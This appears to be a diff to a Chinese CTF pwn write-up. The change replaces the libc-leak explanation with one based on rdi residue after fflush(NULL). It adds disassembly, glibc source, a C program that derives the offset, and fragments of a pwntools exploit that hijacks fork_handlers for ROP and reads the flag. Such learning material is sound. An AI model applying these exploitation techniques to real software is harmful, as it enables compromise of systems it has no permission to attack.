@@ -53,38 +53,41 @@
 
 ## 反编译
 
-可以看到反编译后的程序非常精简，设置 seccomp，给出 `stdio` 地址，读取任意写的地址和大小，然后任意写，最后调用 `fork` 后立即通过系统调用退出：
+可以看到反编译后的程序非常精简，设置 seccomp，触发一次 `fflush(0)`，运行一下打印出了某个地址；接着读取任意写的地址和大小，然后任意写，最后调用 `fork` 后立即通过系统调用退出：
 
 ```c
 void __fastcall __noreturn main(int a1, char **a2, char **a3)
 {
-  int v3; // ecx
-  int v4; // r8d
-  int v5; // r9d
+  int v3; // edx
+  int v4; // ecx
+  int v5; // r8d
+  int v6; // r9d
   unsigned __int64 n0xF; // rbx
   __int64 chk; // rax
-  unsigned __int64 v8; // rbx
-  __int64 v9; // r14
-  unsigned __int64 v10; // r15
-  ssize_t v11; // rax
+  unsigned __int64 v9; // rbx
+  __int64 v10; // r14
+  unsigned __int64 v11; // r15
+  ssize_t v12; // rax
   __int16 n19; // [rsp+0h] [rbp-C8h] BYREF
-  int v13; // [rsp+2h] [rbp-C6h]
-  __int16 v14; // [rsp+6h] [rbp-C2h]
+  int v14; // [rsp+2h] [rbp-C6h]
+  __int16 v15; // [rsp+6h] [rbp-C2h]
   _QWORD *dest_1; // [rsp+8h] [rbp-C0h]
   _QWORD dest[23]; // [rsp+10h] [rbp-B8h] BYREF
 
   setvbuf(stdin, 0, 2, 0);
   setvbuf(stdout, 0, 2, 0);
   setvbuf(stderr, 0, 2, 0);
-  memcpy(dest, " ", 0x98u);
+  memcpy(dest, &src_, 0x98u);
   n19 = 19;
-  v13 = 0;
   v14 = 0;
+  v15 = 0;
   dest_1 = dest;
   if ( !prctl(38, 1, 0, 0, 0) && !prctl(22, 2, &n19) )
   {
     n0xF = 0;
-    sub_1C50(22, 2, (_DWORD)stdin, v3, v4, v5, n19);
+    sub_1CE0(22, 2, v3, v4, v5, v6, n19);
+    fflush(0);
+    write(1, 0, 8u);
     do
     {
       chk = _read_chk(0, (char *)dest + n0xF, 16 - n0xF);
@@ -93,20 +96,20 @@ void __fastcall __noreturn main(int a1, char **a2, char **a3)
       n0xF += chk;
     }
     while ( n0xF <= 0xF );
-    v8 = dest[1];
+    v9 = dest[1];
     if ( dest[1] < 0x65u )
     {
       if ( dest[1] )
       {
-        v9 = dest[0];
-        v10 = 0;
+        v10 = dest[0];
+        v11 = 0;
         while ( 1 )
         {
-          v11 = read(0, (void *)(v9 + v10), v8 - v10);
-          if ( v11 <= 0 )
+          v12 = read(0, (void *)(v10 + v11), v9 - v11);
+          if ( v12 <= 0 )
             break;
-          v10 += v11;
-          if ( v10 >= v8 )
+          v11 += v12;
+          if ( v11 >= v9 )
             goto LABEL_11;
         }
       }
@@ -119,36 +122,165 @@ LABEL_11:
   }
 LABEL_12:
   syscall(60, 0);
-  JUMPOUT(0x1C41);
+  JUMPOUT(0x1CD1);
 }
 
-unsigned __int64 sub_1C50(int n22, int n2, ...)
+unsigned __int64 sub_1CE0(int n22, int n2, ...)
 {
   gcc_va_list va; // [rsp+B0h] [rbp-28h] BYREF
-  unsigned __int64 v5; // [rsp+D0h] [rbp-8h]
+  unsigned __int64 v4; // [rsp+D0h] [rbp-8h]
 
   va_start(va, n2);
-  v5 = __readfsqword(0x28u);
-  _vprintf_chk(2, "gift: %p\n", va);
+  v4 = __readfsqword(0x28u);
+  _vprintf_chk(2, "gift: ", va);
   return __readfsqword(0x28u);
 }
 ```
 
 可以看到程序提供：
 
-- libc 泄漏：`gift: %p` 打印 `stdin` 地址
+- libc 泄漏：`fflush(NULL)` 返回前的寄存器残留 + `write(1, rdi, 8)`
 - 一次任意地址写：`read` 到任意地址，大小为 100 字节
 - 退出前调用 `fork()`：一定触发 fork handlers
+
+> IDA 把 `rsi` 误还原成 0，真实为 `mov rsi, rdi`，因此是 `write(1, rdi, 8)` 泄漏。
 
 ---
 
 ## 漏洞点总结
 
-1. 通过 `gift` 泄漏的 `stdin` 地址，可以非常容易地计算出 libc 基址
+1. 通过 `fflush(NULL)` 的寄存器残留泄漏 libc 指针
 2. 小范围任意写
 3. `fork()` 被调用
 
+---
+
+## `fflush(NULL)` 泄漏说明
+
+从反汇编可以看到一段固定序列：
+
+```
+.text:0000000000001C1E                 call    sub_1CE0
+.text:0000000000001C1E
+.text:0000000000001C23                 xor     edi, edi        ; stream
+.text:0000000000001C25                 call    cs:fflush_ptr
+.text:0000000000001C25
+.text:0000000000001C2B                 mov     rsi, rdi        ; buf
+.text:0000000000001C2E                 mov     edx, 8          ; n
+.text:0000000000001C33                 mov     edi, 1          ; fd
+.text:0000000000001C38                 call    cs:write_ptr
+```
+
+关键在于 `fflush(NULL)` 返回后 `rdi` 保留为指向栈上 cleanup buffer 的指针。
+随后程序执行 `write(1, rdi, 8)`，将 `rdi` 指向的内存的前 8 字节输出到 stdout。
+
+需要注意的是：
+- `rdi` 是一个栈地址，指向 `_pthread_cleanup_buffer` 结构
+- 该结构的第一个字段 `__prev` 是一个指向 libc 内部的指针
+- `write(1, rdi, 8)` 输出的就是这个 `__prev` 字段的值
+- 该值在本题中固定为 `libc_base + 0x8f1e0`
+
+执行流程如下：
+1. `fflush(NULL)` → `__libc_cleanup_pop_restore(&_buffer)` 
+2. 函数返回时 `rdi = &_buffer`
+3. `write(1, rdi, 8)` 输出 `_buffer` 的前 8 字节内容
+4. 该内容是一个 libc 指针，可用于计算 libc 基址
+
+结合 glibc 源码可以更清晰地理解 `rdi` 的来源：
+
+- `fflush(NULL)` 会遍历所有 `FILE` 并调用 `_IO_flush_all`。
+- `_IO_flush_all_lockp` 结束时会调用 `_IO_cleanup_region_end(0)`。
+- `_IO_cleanup_region_end` 最终调用 `__libc_cleanup_pop_restore`，其第一个参数是栈上的 cleanup buffer，保存在寄存器中并沿用到返回路径。
+
+对应的 `__libc_cleanup_pop_restore` 实现：
+
+```c
+void
+__libc_cleanup_pop_restore (struct _pthread_cleanup_buffer *buffer)
+{
+  struct pthread *self = THREAD_SELF;
+
+  THREAD_SETMEM (self, cleanup, buffer->__prev);
+
+  int cancelhandling = atomic_load_relaxed (&self->cancelhandling);
+  if (buffer->__canceltype != PTHREAD_CANCEL_DEFERRED
+      && (cancelhandling & CANCELTYPE_BITMASK) == 0)
+    {
+      int newval;
+      do
+	{
+	  newval = cancelhandling | CANCELTYPE_BITMASK;
+	}
+      while (!atomic_compare_exchange_weak_acquire (&self->cancelhandling,
+						    &cancelhandling, newval));
+
+      if (cancel_enabled_and_canceled (cancelhandling))
+	__do_cancel (PTHREAD_CANCELED);
+    }
+}
+libc_hidden_def (__libc_cleanup_pop_restore)
+```
+
+在实际运行中，该 qword 落在 libc 映射区，其偏移固定为 `libc_base + 0x8f1e0`。`_pthread_cleanup_buffer` 结构的第一个字段通常是 `__prev` 指针，它指向上一个 cleanup buffer。在 `fflush(NULL)` 的执行过程中，这个字段会被设置为指向 glibc 内部的某个固定位置，因此可以用来泄漏 libc 地址。偏移获取方式如下：
+
+1. 用提供的 `ld-linux-x86-64.so.2` 启动一个最小复现程序，`fflush(NULL)` 后从 `rdi` 取 cleanup buffer 指针，并打印首 qword。
+2. 对该地址执行 `dladdr`，得到 `libc` 的 `dli_fbase`，计算：
+  $$
+  	\text{offset} = \text{leak} - \text{libc\_base}
+  $$
+3. 得到 `0x8f1e0`。
+
+复现程序如下：
+
+```c
+#define _GNU_SOURCE
+#include <dlfcn.h>
+#include <stdint.h>
+#include <stdio.h>
+#include <stdlib.h>
+
+int main(void)
+{
+	void *cleanup_buf;
+	uint64_t leak;
+	Dl_info info;
+
+	printf("gift: ");
+	fflush(NULL);
+	asm volatile("mov %%rdi, %0" : "=r"(cleanup_buf));
+	leak = *(uint64_t *)cleanup_buf;
+
+	if (dladdr((void *)leak, &info) == 0) {
+		puts("dladdr failed");
+		return 1;
+	}
+
+	printf("cleanup_buf=%p\n", cleanup_buf);
+	printf("leak=%p\n", (void *)leak);
+	printf("libc_base=%p\n", info.dli_fbase);
+	printf("offset=0x%lx\n", leak - (uint64_t)info.dli_fbase);
+	return 0;
+}
+```
+
+编译运行：
+
+```bash
+❯ gcc -O0 -no-pie -fno-pie -ldl offset.c -o offset
+❯ ./ld-linux-x86-64.so.2 --library-path . ./offset
+gift: cleanup_buf=0x7fffffffd7b0
+leak=0x7ffff7c8f1e0
+libc_base=0x7ffff7c00000
+offset=0x8f1e0
+```
+
+$$
+  	\text{libc\_base} = \text{leak} - 0x8f1e0
+$$
+
 加上 seccomp 禁用 `execve`，只能走 ORW。
+
+其实 pwndbg 简单动调一下即可，很明显是 libc 的地址，在本地调试时关闭 ASLR 减去 libc 基址就是偏移量，打远程时拿到泄漏的地址，减去偏移量就能得到远程 ASLR 开启下的 libc 基址了。 
 
 ---
 
@@ -213,7 +345,7 @@ payload2 += b"flag\x00"
 
 ## 总结
 
-1. 读取 `stdin` 泄漏，算 libc base
+1. `fflush(0)` 后 `write(1, rdi, 8)` 泄漏 libc 指针，计算 libc base
 2. 定位 `fork_handlers`
 3. 用第一次写改 `fork_handlers` 为 `gets -> setcontext`
 4. `fork()` 触发 `gets`，写入 `ucontext + ROP`
@@ -230,8 +362,8 @@ from pwn import *
 context.log_level = "debug"
 context.arch = "amd64"
 
-io = process("./vuln_patched")
-# io = remote("localhost", 9999)
+# io = process("./vuln_patched")
+io = remote("localhost", 9999)
 
 libc = ELF("./libc.so.6")
 
@@ -309,11 +441,9 @@ def build_ucontext(rsp, rip, rdi=0, rsi=0, rdx=0):
 
 
 io.recvuntil(b"gift: ")
-leak_line = io.recvline().strip()
-stdin_leak = int(leak_line, 16)
-log.success(f"stdin leak: {hex(stdin_leak)}")
-
-libc.address = stdin_leak - libc.sym["_IO_2_1_stdin_"]
+leak = u64(io.recvn(8))
+# fflush(NULL) cleanup buffer q[0] = libc_base + 0x8f1e0
+libc.address = leak - 0x8F1E0
 log.success(f"libc base: {hex(libc.address)}")
 
 # After my local tests, following are the addresses of fork_handlers in different glibc versions.
